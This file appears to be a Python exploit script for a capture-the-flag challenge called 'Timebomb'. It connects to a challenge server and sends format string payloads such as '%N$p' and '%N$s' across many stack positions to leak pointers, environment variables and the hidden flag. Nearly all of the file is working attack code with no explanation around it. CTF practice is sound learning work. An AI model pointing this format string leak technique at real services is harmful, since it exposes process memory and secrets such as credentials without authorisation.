#!/usr/bin/env python3
"""
Timebomb CTF - Flag Leakage via Format String
Goal: Leak the FLAG environment variable using format string vulnerability
"""

import socket
import time

HOST = "timebomb-dc33.hexnova.quest"
PORT = 9999

def send_payload(payload, debug=False):
    """Send payload and get response"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    if debug:
        print(f"Sending: {payload}")
    
    s.send(payload.encode() + b'\n')
    
    # Get full response
    response = b""
    s.settimeout(3)
    try:
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    
    s.close()
    return response.decode('utf-8', errors='ignore')

def leak_environment_pointers():
    """Leak pointers that might point to environment variables"""
    print("=== Searching for Environment Variable Pointers ===")
    
    for i in range(1, 50):
        payload = f"ENV{i:02d}.%{i}$p"
        response = send_payload(payload, debug=False)
        
        if "Enter your OVERRIDE CODE:" in response:
            parts = response.split("Enter your OVERRIDE CODE: ")[1].split("\n")[0].strip()
            print(f"Position {i:2d}: {parts}")
            time.sleep(0.1)

def leak_strings_at_positions():
    """Try to read strings at various stack positions"""
    print("\n=== Leaking Strings from Stack Positions ===")
    
    for i in range(1, 50):
        payload = f"STR%{i}$s"  # Read string at position i
        response = send_payload(payload, debug=False)
        
        if "Enter your OVERRIDE CODE:" in response:
            parts = response.split("Enter your OVERRIDE CODE: ")[1].split("\n")[0].strip()
            # Look for interesting strings
            if "FLAG" in parts or "HEX" in parts or "http" in parts or len(parts) > 20:
                print(f"Interesting string at pos {i}: {parts}")
            elif parts and parts != f"STR":
                print(f"String at pos {i}: {parts[:50]}...")
            time.sleep(0.1)

def search_for_flag_in_memory():
    """Try different approaches to find the FLAG variable"""
    print("\n=== Searching for FLAG Environment Variable ===")
    
    # Strategy 1: Look for environ pointer and traverse it
    # Environment variables are typically stored as an array of pointers
    
    print("Testing direct string reads:")
    test_positions = [1, 2, 3, 5, 7, 8, 9, 10, 15, 20, 25, 30, 35, 40, 45]
    
    for pos in test_positions:
        payload = f"%{pos}$s"
        response = send_payload(payload, debug=False)
        
        if "Enter your OVERRIDE CODE:" in response:
            result = response.split("Enter your OVERRIDE CODE: ")[1].split("\n")[0].strip()
            if result and len(result) > 5:
                if "FLAG" in result or "HEX" in result or "NOVA" in result:
                    print(f"*** POTENTIAL FLAG at position {pos}: {result}")
                elif "=" in result:  # Looks like env var
                    print(f"Environment var at pos {pos}: {result[:60]}...")
                elif result.startswith("http") or result.startswith("curl"):
                    print(f"URL/Command at pos {pos}: {result[:60]}...")
        time.sleep(0.1)

def targeted_flag_search():
    """More targeted search for FLAG variable"""
    print("\n=== Targeted FLAG Search ===")
    
    # Look for patterns that might indicate environment variables
    for i in range(1, 100):
        # Try reading as string
        payload = f"F%{i}$s"
        response = send_payload(payload, debug=False)
        
        if "Enter your OVERRIDE CODE:" in response:
            result = response.split("Enter your OVERRIDE CODE: ")[1].split("\n")[0].strip()
            
            # Check for flag patterns
            if result and ("FLAG" in result or "HEX{" in result or "NOVA{" in result):
                print(f"*** FOUND FLAG CANDIDATE at position {i}: {result}")
                return result
            elif result and "=" in result and len(result) > 10:
                print(f"Env var at pos {i}: {result[:80]}...")
        
        time.sleep(0.05)  # Faster search
    
    return None

def read_memory_chunks():
    """Try to read large chunks of memory to find the flag"""
    print("\n=== Reading Memory Chunks ===")
    
    # Try positions that gave us addresses before
    interesting_positions = [18, 19, 21, 22, 23, 24, 25]
    
    for pos in interesting_positions:
        print(f"\nTrying to read memory at position {pos}:")
        
        # First get the address
        payload = f"ADDR.%{pos}$p"
        response = send_payload(payload, debug=True)
        
        if "0x" in response:
            addr_str = response.split("0x")[1].split()[0]
            try:
                addr = int(addr_str, 16)
                print(f"  Address: 0x{addr:x}")
                
                # Now try to read string at this address
                payload2 = f"READ.%{pos}$s"
                response2 = send_payload(payload2, debug=False)
                
                if "Enter your OVERRIDE CODE:" in response2:
                    result = response2.split("Enter your OVERRIDE CODE: ")[1].split("\n")[0].strip()
                    if result and len(result) > 5:
                        if "FLAG" in result or "HEX{" in result:
                            print(f"*** POTENTIAL FLAG: {result}")
                        else:
                            print(f"  String: {result[:60]}...")
                
            except ValueError:
                continue
        
        time.sleep(0.2)

if __name__ == "__main__":
    print("=== Timebomb CTF - Environment Variable Flag Leak ===")
    
    # Multiple strategies to find the flag
    leak_environment_pointers()
    leak_strings_at_positions() 
    search_for_flag_in_memory()
    
    # Targeted search
    flag = targeted_flag_search()
    
    if not flag:
        read_memory_chunks()
    
    print("\n=== Search Complete ===")
    if flag:
        print(f"FLAG FOUND: {flag}")
    else:
        print("Flag not found in initial search. May need deeper analysis.")